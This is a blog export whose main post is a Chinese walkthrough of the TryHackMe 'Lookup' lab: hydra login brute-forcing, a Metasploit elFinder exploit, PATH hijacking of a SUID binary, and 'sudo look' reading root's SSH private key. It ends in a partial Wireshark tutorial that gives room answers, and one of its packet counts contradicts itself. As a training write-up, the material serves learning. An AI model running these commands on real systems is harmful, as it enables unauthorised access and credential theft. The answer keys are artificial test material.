id\n```\n\n![shell](/images/lookup-教程/think.png)\n\n别忘了给这个id文件加上可执行的权限\n\n```\nchmod +x id\n```\n然后修改一下环境变量 将 /tmp 目录添加到 PATH 变量的最前面。系统在查找可执行文件时，会首先查找 /tmp 目录中的文件。\n\n如果 /tmp 目录中有可执行文件，直接输入命令时，系统会优先在 /tmp 中寻找该命令。\n\n![shell](/images/lookup-教程/export.png)\n\n重新运行/usr/sbin/pwm 就能看到爆出来了一堆密码(没猜错就是密码)\n\n![shell](/images/lookup-教程/jose1.png)\n\n把这些复制下来 粘贴到一个文本文档中 做成一个密码本 用户名为think 用hydra爆破ssh的密码 \n\n```\nhydra -l think -P /path/你的密码本文件名 ssh://lookup.thm\n```\n\n![shell](/images/lookup-教程/mima.png)\n\n用这个用户名和密码就能成功ssh连接上think这个用户 然后直接ls就能查看到user.txt\n\n![mima](/images/lookup-教程/user.png)\n\n成功爆破 还有一个root用户还没解决 我们sudo -l查看能运行什么命令 有个look 我们到这里[GTFOBins](https://gtfobins.github.io/gtfobins/) 搜索look \n\n![mima](/images/lookup-教程/sudo.png)\n\n这也是个漏洞 让他爆出root的秘钥\n\n![mima](/images/lookup-教程/look2.png)\n\n```\nLFILE = /root/.ssh/id_rsa \n\nsudo look ''  “ $LFILE ”\n```\n\n![mima](/images/lookup-教程/look.png)\n\n最后把 秘钥粘贴到一个文本文件中  成功登录 ls就能看到root.txt 第二问解决\n\n```\nssh -i 文件名 root@lookup.thm\n```\n\n![mima](/images/lookup-教程/ssh.png)\n\n![mima](/images/lookup-教程/root.png)\n\nlookup只能说很细节 用了msf hydra 提权 提权还是不懂 我都是网站找的python的搞 这个纯纯弱项了 还有hydra也折腾了好久 本来是rockyou.txt一直梭 但一直不出 换了好几个用户名的字典 才把用户名搞出来\n要破解网站要加这个\"username=^USER^&password=^PASS^:网页输错的提示\"一开始是很不理解为啥这样的 这个网站一个是密码和用户名全错 一个是用户名错 就用这个提示把密码筛选出来 然后用密码破用户名 学的东西还挺多的\n","source":"_posts/lookup-教程.md","raw":"---\ntitle: lookup 教程\ndate: 2025-01-31 19:07:31\ntags: linux 渗透\ntop_img: transparent\ncover: https://s2.loli.net/2025/02/01/21dnkp68VGWhuQD.jpg\n---\n# lookup 教程\n![lookup](/images/lookup-教程/head.png)\n\n这次来了个lookup 话不多说 直接看题\n\n![lookup](/images/lookup-教程/title.png)\n\n## 第一步\n我们还是绑一下域名 就是在/etc/hosts里面输你的机器ip 加lookup.thm\n\n这个就不上图了 记得顺便把file.lookup.thm也绑一下hosts 不然等下登录进去就会发现登不进去\n\n![file](/images/lookup-教程/fail.png)\n\n## 第二步\n我们访问lookup.thm 发现是个登录界面 先随便输几个试试水 经过发现会有两个提示 第一个是密码错误 第二个是密码和账户都错误 用hydra来搞一下 看看能破解出来吗 \n\n```\nhydra -l admin -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form  \"/login.php:username=^USER^&password=^PASS^:Wrong Password. Please try again\"\n\nhydra -L /usr/share/wordlists/rockyou.txt -p password123 lookup.thm http-post-form  -vV \"/login.php:username=^USER^&password=^PASS^:Wrong username or password. Please try again.\"\n```\n\n通过第一个代码 能够爆出密码是晒 第二个代码可以把账户名也搞出来\n\n![hydra](/images/lookup-教程/password.png)\n\n![hydra](/images/lookup-教程/password2.png)\n\n## 第三步\n破解出密码之后 我们登录进去看看怎么个事 发现是个类似文件夹的管理系统 文件基本上都是上锁了 看看没解锁的文件有啥提示吗 \n\n![lock](/images/lookup-教程/file1.png)\n\n好吧 也没提示啥 偶然发现了这个文件夹是elfinder 版本号也知道 搜一下看有漏洞吗 发现是有的 我们打开msf 搜一下这个漏洞\n\n![lock](/images/lookup-教程/banbaen.png)\n\n![msf](/images/lookup-教程/msf.png)\n\n配置一下rhost和lhost这两个参数 一个是你要攻击的域名 一个是你本机的ip run一下 我们成功打进去了\n\n![msf](/images/lookup-教程/msf1.png)\n\n## 第四步\n这个有有点困难了 要提权 先find /--perm 4000 2>/dev/null 查看suid用户 发现一个叫pwn的用户 感觉这个是解题关键 ls查看一下详细信息 所属root \n\n```\nfind /--perm 4000 2>/dev/null \n```\n\n>/dev/null 表示将标准错误输出重定向到 /dev/null，这相当于丢弃错误信息。\n\n\n![shell](/images/lookup-教程/pwn.png)\n\n\n![shell](/images/lookup-教程/pwn2.png)\n\n输入/usr/sbin/pwm 他告诉我们提示 输入ip 会显示用户名 我们就得想办法的让他爆名字 输入id这个命令能知道用户名\n\n![shell](/images/lookup-教程/id.png)\n\n我们在/tmp中搞一个id的文本文件 id think用户 \n\n```\necho -e '#!/bin/bash\\n echo \"uid=33(think) gid=33(think) groups=33(think)\"' > id\n```\n\n![shell](/images/lookup-教程/think.png)\n\n别忘了给这个id文件加上可执行的权限\n\n```\nchmod +x id\n```\n然后修改一下环境变量 将 /tmp 目录添加到 PATH 变量的最前面。系统在查找可执行文件时，会首先查找 /tmp 目录中的文件。\n\n如果 /tmp 目录中有可执行文件，直接输入命令时，系统会优先在 /tmp 中寻找该命令。\n\n![shell](/images/lookup-教程/export.png)\n\n重新运行/usr/sbin/pwm 就能看到爆出来了一堆密码(没猜错就是密码)\n\n![shell](/images/lookup-教程/jose1.png)\n\n把这些复制下来 粘贴到一个文本文档中 做成一个密码本 用户名为think 用hydra爆破ssh的密码 \n\n```\nhydra -l think -P /path/你的密码本文件名 ssh://lookup.thm\n```\n\n![shell](/images/lookup-教程/mima.png)\n\n用这个用户名和密码就能成功ssh连接上think这个用户 然后直接ls就能查看到user.txt\n\n![mima](/images/lookup-教程/user.png)\n\n成功爆破 还有一个root用户还没解决 我们sudo -l查看能运行什么命令 有个look 我们到这里[GTFOBins](https://gtfobins.github.io/gtfobins/) 搜索look \n\n![mima](/images/lookup-教程/sudo.png)\n\n这也是个漏洞 让他爆出root的秘钥\n\n![mima](/images/lookup-教程/look2.png)\n\n```\nLFILE = /root/.ssh/id_rsa \n\nsudo look ''  “ $LFILE ”\n```\n\n![mima](/images/lookup-教程/look.png)\n\n最后把 秘钥粘贴到一个文本文件中  成功登录 ls就能看到root.txt 第二问解决\n\n```\nssh -i 文件名 root@lookup.thm\n```\n\n![mima](/images/lookup-教程/ssh.png)\n\n![mima](/images/lookup-教程/root.png)\n\nlookup只能说很细节 用了msf hydra 提权 提权还是不懂 我都是网站找的python的搞 这个纯纯弱项了 还有hydra也折腾了好久 本来是rockyou.txt一直梭 但一直不出 换了好几个用户名的字典 才把用户名搞出来\n要破解网站要加这个\"username=^USER^&password=^PASS^:网页输错的提示\"一开始是很不理解为啥这样的 这个网站一个是密码和用户名全错 一个是用户名错 就用这个提示把密码筛选出来 然后用密码破用户名 学的东西还挺多的\n","slug":"lookup-教程","published":1,"updated":"2025-02-01T15:14:08.742Z","comments":1,"layout":"post","photos":[],"_id":"cm74njvxg000mtsg6ea933niu","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><h1 id=\"lookup-教程\"><a href=\"#lookup-教程\" class=\"headerlink\" title=\"lookup 教程\"></a>lookup 教程</h1><p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/head.png\" alt=\"lookup\"></p>\n<p>这次来了个lookup 话不多说 直接看题</p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/title.png\" alt=\"lookup\"></p>\n<h2 id=\"第一步\"><a href=\"#第一步\" class=\"headerlink\" title=\"第一步\"></a>第一步</h2><p>我们还是绑一下域名 就是在&#x2F;etc&#x2F;hosts里面输你的机器ip 加lookup.thm</p>\n<p>这个就不上图了 记得顺便把file.lookup.thm也绑一下hosts 不然等下登录进去就会发现登不进去</p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/fail.png\" alt=\"file\"></p>\n<h2 id=\"第二步\"><a href=\"#第二步\" class=\"headerlink\" title=\"第二步\"></a>第二步</h2><p>我们访问lookup.thm 发现是个登录界面 先随便输几个试试水 经过发现会有两个提示 第一个是密码错误 第二个是密码和账户都错误 用hydra来搞一下 看看能破解出来吗 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hydra -l admin -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form  &quot;/login.php:username=^USER^&amp;password=^PASS^:Wrong Password. Please try again&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">hydra -L /usr/share/wordlists/rockyou.txt -p password123 lookup.thm http-post-form  -vV &quot;/login.php:username=^USER^&amp;password=^PASS^:Wrong username or password. Please try again.&quot;</span><br></pre></td></tr></table></figure>\n\n<p>通过第一个代码 能够爆出密码是晒 第二个代码可以把账户名也搞出来</p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/password.png\" alt=\"hydra\"></p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/password2.png\" alt=\"hydra\"></p>\n<h2 id=\"第三步\"><a href=\"#第三步\" class=\"headerlink\" title=\"第三步\"></a>第三步</h2><p>破解出密码之后 我们登录进去看看怎么个事 发现是个类似文件夹的管理系统 文件基本上都是上锁了 看看没解锁的文件有啥提示吗 </p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/file1.png\" alt=\"lock\"></p>\n<p>好吧 也没提示啥 偶然发现了这个文件夹是elfinder 版本号也知道 搜一下看有漏洞吗 发现是有的 我们打开msf 搜一下这个漏洞</p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/banbaen.png\" alt=\"lock\"></p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/msf.png\" alt=\"msf\"></p>\n<p>配置一下rhost和lhost这两个参数 一个是你要攻击的域名 一个是你本机的ip run一下 我们成功打进去了</p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/msf1.png\" alt=\"msf\"></p>\n<h2 id=\"第四步\"><a href=\"#第四步\" class=\"headerlink\" title=\"第四步\"></a>第四步</h2><p>这个有有点困难了 要提权 先find &#x2F;–perm 4000 2&gt;&#x2F;dev&#x2F;null 查看suid用户 发现一个叫pwn的用户 感觉这个是解题关键 ls查看一下详细信息 所属root </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find /--perm 4000 2&gt;/dev/null </span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>&#x2F;dev&#x2F;null 表示将标准错误输出重定向到 &#x2F;dev&#x2F;null，这相当于丢弃错误信息。</p>\n</blockquote>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/pwn.png\" alt=\"shell\"></p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/pwn2.png\" alt=\"shell\"></p>\n<p>输入&#x2F;usr&#x2F;sbin&#x2F;pwm 他告诉我们提示 输入ip 会显示用户名 我们就得想办法的让他爆名字 输入id这个命令能知道用户名</p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/id.png\" alt=\"shell\"></p>\n<p>我们在&#x2F;tmp中搞一个id的文本文件 id think用户 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo -e &#x27;#!/bin/bash\\n echo &quot;uid=33(think) gid=33(think) groups=33(think)&quot;&#x27; &gt; id</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/think.png\" alt=\"shell\"></p>\n<p>别忘了给这个id文件加上可执行的权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod +x id</span><br></pre></td></tr></table></figure>\n<p>然后修改一下环境变量 将 &#x2F;tmp 目录添加到 PATH 变量的最前面。系统在查找可执行文件时，会首先查找 &#x2F;tmp 目录中的文件。</p>\n<p>如果 &#x2F;tmp 目录中有可执行文件，直接输入命令时，系统会优先在 &#x2F;tmp 中寻找该命令。</p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/export.png\" alt=\"shell\"></p>\n<p>重新运行&#x2F;usr&#x2F;sbin&#x2F;pwm 就能看到爆出来了一堆密码(没猜错就是密码)</p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/jose1.png\" alt=\"shell\"></p>\n<p>把这些复制下来 粘贴到一个文本文档中 做成一个密码本 用户名为think 用hydra爆破ssh的密码 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hydra -l think -P /path/你的密码本文件名 ssh://lookup.thm</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/mima.png\" alt=\"shell\"></p>\n<p>用这个用户名和密码就能成功ssh连接上think这个用户 然后直接ls就能查看到user.txt</p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/user.png\" alt=\"mima\"></p>\n<p>成功爆破 还有一个root用户还没解决 我们sudo -l查看能运行什么命令 有个look 我们到这里<a href=\"https://gtfobins.github.io/gtfobins/\">GTFOBins</a> 搜索look </p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/sudo.png\" alt=\"mima\"></p>\n<p>这也是个漏洞 让他爆出root的秘钥</p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/look2.png\" alt=\"mima\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LFILE = /root/.ssh/id_rsa </span><br><span class=\"line\"></span><br><span class=\"line\">sudo look &#x27;&#x27;  “ $LFILE ”</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/look.png\" alt=\"mima\"></p>\n<p>最后把 秘钥粘贴到一个文本文件中  成功登录 ls就能看到root.txt 第二问解决</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -i 文件名 root@lookup.thm</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/ssh.png\" alt=\"mima\"></p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/root.png\" alt=\"mima\"></p>\n<p>lookup只能说很细节 用了msf hydra 提权 提权还是不懂 我都是网站找的python的搞 这个纯纯弱项了 还有hydra也折腾了好久 本来是rockyou.txt一直梭 但一直不出 换了好几个用户名的字典 才把用户名搞出来<br>要破解网站要加这个”username&#x3D;^USER^&amp;password&#x3D;^PASS^:网页输错的提示”一开始是很不理解为啥这样的 这个网站一个是密码和用户名全错 一个是用户名错 就用这个提示把密码筛选出来 然后用密码破用户名 学的东西还挺多的</p>\n","excerpt":"","more":"<h1 id=\"lookup-教程\"><a href=\"#lookup-教程\" class=\"headerlink\" title=\"lookup 教程\"></a>lookup 教程</h1><p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/head.png\" alt=\"lookup\"></p>\n<p>这次来了个lookup 话不多说 直接看题</p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/title.png\" alt=\"lookup\"></p>\n<h2 id=\"第一步\"><a href=\"#第一步\" class=\"headerlink\" title=\"第一步\"></a>第一步</h2><p>我们还是绑一下域名 就是在&#x2F;etc&#x2F;hosts里面输你的机器ip 加lookup.thm</p>\n<p>这个就不上图了 记得顺便把file.lookup.thm也绑一下hosts 不然等下登录进去就会发现登不进去</p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/fail.png\" alt=\"file\"></p>\n<h2 id=\"第二步\"><a href=\"#第二步\" class=\"headerlink\" title=\"第二步\"></a>第二步</h2><p>我们访问lookup.thm 发现是个登录界面 先随便输几个试试水 经过发现会有两个提示 第一个是密码错误 第二个是密码和账户都错误 用hydra来搞一下 看看能破解出来吗 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hydra -l admin -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form  &quot;/login.php:username=^USER^&amp;password=^PASS^:Wrong Password. Please try again&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">hydra -L /usr/share/wordlists/rockyou.txt -p password123 lookup.thm http-post-form  -vV &quot;/login.php:username=^USER^&amp;password=^PASS^:Wrong username or password. Please try again.&quot;</span><br></pre></td></tr></table></figure>\n\n<p>通过第一个代码 能够爆出密码是晒 第二个代码可以把账户名也搞出来</p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/password.png\" alt=\"hydra\"></p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/password2.png\" alt=\"hydra\"></p>\n<h2 id=\"第三步\"><a href=\"#第三步\" class=\"headerlink\" title=\"第三步\"></a>第三步</h2><p>破解出密码之后 我们登录进去看看怎么个事 发现是个类似文件夹的管理系统 文件基本上都是上锁了 看看没解锁的文件有啥提示吗 </p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/file1.png\" alt=\"lock\"></p>\n<p>好吧 也没提示啥 偶然发现了这个文件夹是elfinder 版本号也知道 搜一下看有漏洞吗 发现是有的 我们打开msf 搜一下这个漏洞</p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/banbaen.png\" alt=\"lock\"></p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/msf.png\" alt=\"msf\"></p>\n<p>配置一下rhost和lhost这两个参数 一个是你要攻击的域名 一个是你本机的ip run一下 我们成功打进去了</p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/msf1.png\" alt=\"msf\"></p>\n<h2 id=\"第四步\"><a href=\"#第四步\" class=\"headerlink\" title=\"第四步\"></a>第四步</h2><p>这个有有点困难了 要提权 先find &#x2F;–perm 4000 2&gt;&#x2F;dev&#x2F;null 查看suid用户 发现一个叫pwn的用户 感觉这个是解题关键 ls查看一下详细信息 所属root </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find /--perm 4000 2&gt;/dev/null </span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>&#x2F;dev&#x2F;null 表示将标准错误输出重定向到 &#x2F;dev&#x2F;null，这相当于丢弃错误信息。</p>\n</blockquote>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/pwn.png\" alt=\"shell\"></p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/pwn2.png\" alt=\"shell\"></p>\n<p>输入&#x2F;usr&#x2F;sbin&#x2F;pwm 他告诉我们提示 输入ip 会显示用户名 我们就得想办法的让他爆名字 输入id这个命令能知道用户名</p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/id.png\" alt=\"shell\"></p>\n<p>我们在&#x2F;tmp中搞一个id的文本文件 id think用户 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo -e &#x27;#!/bin/bash\\n echo &quot;uid=33(think) gid=33(think) groups=33(think)&quot;&#x27; &gt; id</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/think.png\" alt=\"shell\"></p>\n<p>别忘了给这个id文件加上可执行的权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod +x id</span><br></pre></td></tr></table></figure>\n<p>然后修改一下环境变量 将 &#x2F;tmp 目录添加到 PATH 变量的最前面。系统在查找可执行文件时，会首先查找 &#x2F;tmp 目录中的文件。</p>\n<p>如果 &#x2F;tmp 目录中有可执行文件，直接输入命令时，系统会优先在 &#x2F;tmp 中寻找该命令。</p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/export.png\" alt=\"shell\"></p>\n<p>重新运行&#x2F;usr&#x2F;sbin&#x2F;pwm 就能看到爆出来了一堆密码(没猜错就是密码)</p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/jose1.png\" alt=\"shell\"></p>\n<p>把这些复制下来 粘贴到一个文本文档中 做成一个密码本 用户名为think 用hydra爆破ssh的密码 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hydra -l think -P /path/你的密码本文件名 ssh://lookup.thm</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/mima.png\" alt=\"shell\"></p>\n<p>用这个用户名和密码就能成功ssh连接上think这个用户 然后直接ls就能查看到user.txt</p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/user.png\" alt=\"mima\"></p>\n<p>成功爆破 还有一个root用户还没解决 我们sudo -l查看能运行什么命令 有个look 我们到这里<a href=\"https://gtfobins.github.io/gtfobins/\">GTFOBins</a> 搜索look </p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/sudo.png\" alt=\"mima\"></p>\n<p>这也是个漏洞 让他爆出root的秘钥</p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/look2.png\" alt=\"mima\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LFILE = /root/.ssh/id_rsa </span><br><span class=\"line\"></span><br><span class=\"line\">sudo look &#x27;&#x27;  “ $LFILE ”</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/look.png\" alt=\"mima\"></p>\n<p>最后把 秘钥粘贴到一个文本文件中  成功登录 ls就能看到root.txt 第二问解决</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -i 文件名 root@lookup.thm</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/ssh.png\" alt=\"mima\"></p>\n<p><img src=\"/images/lookup-%E6%95%99%E7%A8%8B/root.png\" alt=\"mima\"></p>\n<p>lookup只能说很细节 用了msf hydra 提权 提权还是不懂 我都是网站找的python的搞 这个纯纯弱项了 还有hydra也折腾了好久 本来是rockyou.txt一直梭 但一直不出 换了好几个用户名的字典 才把用户名搞出来<br>要破解网站要加这个”username&#x3D;^USER^&amp;password&#x3D;^PASS^:网页输错的提示”一开始是很不理解为啥这样的 这个网站一个是密码和用户名全错 一个是用户名错 就用这个提示把密码筛选出来 然后用密码破用户名 学的东西还挺多的</p>\n"},{"title":"tryhackme wireshark入门三部曲","date":"2025-02-04T00:37:18.000Z","top_img":"transparent","cover":"https://s2.loli.net/2025/02/04/xtlwMk9HLNGWiyE.jpg","_content":"\nwireshark 一个流量分析的工具 一个抓取流量包的工具\n一个暗藏~~只因~~(玄机)的工具 只要擅长使用这个工具能带来很大的帮助 \n\n简单看看tryhackme的wireshark教程 总共是分为三个部分\n\n![title](/images/tryhackme-wireshark小tips/title.png)\n\n# the basic\n\n基础部分当然是介绍解释wireshark的操作界面和基础功能\n\n先来看看初始界面\n\n![chushi](/images/tryhackme-wireshark小tips/zhuomian.png)\n\n从上往下分别是工具栏，显示过滤栏(用来过滤我们需要的东西)，最近文件，捕获过滤器和接口，状态栏\n\n![in](/images/tryhackme-wireshark小tips/inzhuo.png)\n\n这个界面就是一般我们平时使用的上面红色的部分就是数据包列表，中间的分别是数据包细节和数据包的字节，最下面是告诉我们有几个数据包 以及展示的数据包数目。\n\n我们来看一下task2 讲了啥东西\n\n## task 2\nWireshark 是目前最强大的流量分析工具之一。它有多种用途：\n\n- 检测并排除网络问题，例如网络负载故障点和拥塞。\n- 检测安全异常，例如恶意主机、异常端口使用和可疑流量。\n- 调查和了解协议细节，例如响应代码和有效负载数据。\n\n科普完毕 来看一下他要求\n\n![task](/images/tryhackme-wireshark小tips/task2.png)\n\n需要我们去查看文件信息 点击这个就可以查看文件信息 我们往下滑就能看到 全部题目的答案\n\n![st](/images/tryhackme-wireshark小tips/st.png)\n\n![st](/images/tryhackme-wireshark小tips/hash.png)\n\n![st](/images/tryhackme-wireshark小tips/flag.png)\n\n\n第一题的flag就在底下 \n\n```\nans:TryHackMe_Wireshark_Demo\n```\n\n数据包的总数为58620个 \n\n```\nans:57620\n```\n\nhash值也显而易见\n\n```\nf446de335565fb0b0ee5e5a3266703c778b2f3dfad7efeaeccb2da5641a6d6eb\n```\n\n## task3\n\n![task](/images/tryhackme-wireshark小tips/task3.png)\n\n查找数据包的编号先\n\n![task](/images/tryhackme-wireshark小tips/finds.png)\n\n\n![task](/images/tryhackme-wireshark小tips/38.png)\n\n可以发现使用了xml语言\n\n```\nans:eXtensible Markup Language\n```\n\n看时间的话 就得点进去慢慢找了 其实点进去就能发现到达时间\n\n![time](/images/tryhackme-wireshark小tips/time.png)\n\n```\nans:13/05/2004\n```\n\nttl就是time to live 存活周期 是在osi的第三层 网络层那里 我们就到ip的那个部分找找\n\n![time](/images/tryhackme-wireshark小tips/ttl.png)\n\n```\nans:47\n```\n\ntcp的有效负载大小 就得在数据包细节找到tcp的部分 负载应该能理解成一端的大小\n\ntcp是在第四层 传输层\n\n![tcp](/images/tryhackme-wireshark小tips/tcp.png)\n\n```\nans:424\n```\n\netag也在这附近 在底下找找就有了\n\n![tcp](/images/tryhackme-wireshark小tips/etag.png)\n\n## task4\n\n![task4](/images/tryhackme-wireshark小tips/task4.png)\n\n查r4w这个字串 的第一个艺术家叫啥名字\n\n![task4](/images/tryhackme-wireshark小tips/r4w.png)\n\n![task4](/images/tryhackme-wireshark小tips/r4w1.png)\n\n能看到第一个艺术家的名字 \n\n```\nans:r4w8173\n```\n\n去编号是12的数据包那看评论是啥 这个就有意思了 \n\n![task4](/images/tryhackme-wireshark小tips/packet1.png)\n\n![task4](/images/tryhackme-wireshark小tips/packet2.png)\n\n![task4](/images/tryhackme-wireshark小tips/12.png)\n\n又让我去39765这个包里面找照片 一开始我是没想到这东西还能直接导出来 后面有一个note.txt也是一样 要我们导出来 cat一下就行 照片就不太一样 他说了要md5 我们用md5sum来把他提取出来\n\n![task4](/images/tryhackme-wireshark小tips/img.png)\n\n导出之后直接md5sum 加你保存的文件名\n\n![task4](/images/tryhackme-wireshark小tips/md5.png)\n\n```\nans:911cd574a42865a956ccde2d04495ebf\n```\n\n需要找一个txt文件 先用过滤器去过滤一下 找到txt文件在哪\n\n![task4](/images/tryhackme-wireshark小tips/note0.png)\n\n然后我们导出http 把note.txt导出来\n\n![task4](/images/tryhackme-wireshark小tips/note.png)\n\n![task4](/images/tryhackme-wireshark小tips/note2.png)\n\n保存之后 我们直接查看就能看到外星人名字\n\n![task4](/images/tryhackme-wireshark小tips/name.png)\n\n```\nans:packermaster\n```\n\n## task5\n\n![task5](/images/tryhackme-wireshark小tips/task5.png)\n\n第一题就是http\n\n```\nans：http\n```\n\n第二题我们过滤了http之后 在底下会有显示展示了多少个数据包\n\n![shujubao](/images/tryhackme-wireshark小tips/http.png)\n\n下面显示1089个\n\n```\nans:1089\n```\n\n第三题 去到33790的包中查看一下细节\n\n![shujubao](/images/tryhackme-wireshark小tips/secend.png)\n\n进http流里面搜索artists 就能看到艺术家名字 会发现艺术家共有三个 第二个叫做Blad3\n\n![shujubao](/images/tryhackme-wireshark小tips/band.png)\n\n```\nans:3\n\nans:Blad3\n```\n\n第一个部分 基础部分结束了 我们来看下一个部分\n\n# Packet Operations\n数据包操作 我们来看点小难的来练练 主要也是深入了解一点wireshark\n\n这个地方是统计 可以看协议的数据包 主要是对数据包进行统计 可以在里面找到你想要的数据包\n\n![qwe](/images/tryhackme-wireshark小tips/packet/ipvx.png)\n\n## task2\n\n![task2](/images/tryhackme-wireshark小tips/packet/task2.png)\n\n第一题我们得在resolved addresses里面去找 因为是在找hostname是bbc的ip\n\n![task2](/images/tryhackme-wireshark小tips/packet/bbc.png)\n\nip为199.232.24.81\n\n第二题是在找ipv4的对话 那我们要在对话里面去找ipv4\n\n![task2](/images/tryhackme-wireshark小tips/packet/ipv4.png)\n\n共有435个对话\n\n第三题 这次我们现在resolved addresses找一下micro-st的地址 然后去endpoint查询这个地址的字节\n\n![task2](/images/tryhackme-wireshark小tips/packet/micro.png)\n\n![task2](/images/tryhackme-wireshark小tips/packet/mac.png)\n\n这两招下来就能找到字节大小 7474bytes\n\n第三题依然是在endpoints里面找 找到city 筛选一下。能找到四个Kansas City有关的地址\n\n![city](/images/tryhackme-wireshark小tips/packet/city.png)\n\n第四题在endpoints 里面找组织 也是筛选一下 就能知道ip是188.246.82.7\n\n![city](/images/tryhackme-wireshark小tips/packet/blicnet.png)\n\n## task3\n\n直接看题目要求\n\n![task3](/images/tryhackme-wireshark小tips/packet/task3.png)\n\n第一问 问最多用的ipv4的目的地址\n\n![task3](/images/tryhackme-wireshark小tips/packet/destination.png)\n\n![task3](/images/tryhackme-wireshark小tips/packet/destination1.png)\n\nip为10.100.1.33 我搞不懂为啥前面还多一个 